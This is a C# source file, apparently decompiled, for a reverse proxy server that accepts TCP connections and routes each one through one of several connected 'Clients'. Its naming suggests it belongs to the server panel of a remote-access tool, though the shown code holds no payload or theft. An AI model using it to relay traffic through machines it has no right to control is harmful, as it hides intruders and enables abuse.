using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using Server.Connection;

namespace Server.Helper;

public class ReverseProxyServer
{
	public delegate void ConnectionEstablishedCallback(ReverseProxyClient proxyClient);

	public delegate void UpdateConnectionCallback(ReverseProxyClient proxyClient);

	private Socket _socket;

	private readonly List<ReverseProxyClient> _clients;

	private uint _clientIndex;

	public ReverseProxyClient[] ProxyClients
	{
		get
		{
			lock (_clients)
			{
				return _clients.ToArray();
			}
		}
	}

	public ReverseProxyClient[] OpenConnections
	{
		get
		{
			lock (_clients)
			{
				List<ReverseProxyClient> list = new List<ReverseProxyClient>();
				for (int i = 0; i < _clients.Count; i++)
				{
					if (_clients[i].ProxySuccessful)
					{
						list.Add(_clients[i]);
					}
				}
				return list.ToArray();
			}
		}
	}

	public Clients[] Clients { get; private set; }

	public event ConnectionEstablishedCallback OnConnectionEstablished;

	public event UpdateConnectionCallback OnUpdateConnection;

	public ReverseProxyServer()
	{
		_clients = new List<ReverseProxyClient>();
	}

	public void StartServer(Clients[] clients, string ipAddress, ushort port)
	{
		Stop();
		Clients = clients;
		_socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
		_socket.Bind(new IPEndPoint(IPAddress.Parse(ipAddress), port));
		_socket.Listen(100);
		_socket.BeginAccept(AsyncAccept, null);
	}

	private void AsyncAccept(IAsyncResult ar)
	{
		try
		{
			lock (_clients)
			{
				_clients.Add(new ReverseProxyClient(Clients[(long)_clientIndex % (long)Clients.Length], _socket.EndAccept(ar), this));
				_clientIndex++;
			}
		}
		catch
		{
		}
		try
		{
			_socket.BeginAccept(AsyncAccept, null);
		}
		catch
		{
		}
	}

	public void Stop()
	{
		if (_socket != null)
		{
			_socket.Close();
			_socket = null;
		}
		lock (_clients)
		{
			foreach (ReverseProxyClient item in new List<ReverseProxyClient>(_clients))
			{
				item.Disconnect();
			}
			_clients.Clear();
		}
	}

	public ReverseProxyClient GetClientByConnectionId(int connectionId)
	{
		lock (_clients)
		{
			return _clients.FirstOrDefault((ReverseProxyClient t) => t.ConnectionId == connectionId);
		}
	}

	internal void CallonConnectionEstablished(ReverseProxyClient proxyClient)
	{
		try
		{
			if (this.OnConnectionEstablished != null)
			{
				this.OnConnectionEstablished(proxyClient);
			}
		}
		catch
		{
		}
	}

	internal void CallonUpdateConnection(ReverseProxyClient proxyClient)
	{
		try
		{
			if (!proxyClient.IsConnected)
			{
				lock (_clients)
				{
					for (int i = 0; i < _clients.Count; i++)
					{
						if (_clients[i].ConnectionId == proxyClient.ConnectionId)
						{
							_clients.RemoveAt(i);
							break;
						}
					}
				}
			}
		}
		catch
		{
		}
		try
		{
			if (this.OnUpdateConnection != null)
			{
				this.OnUpdateConnection(proxyClient);
			}
		}
		catch
		{
		}
	}
}
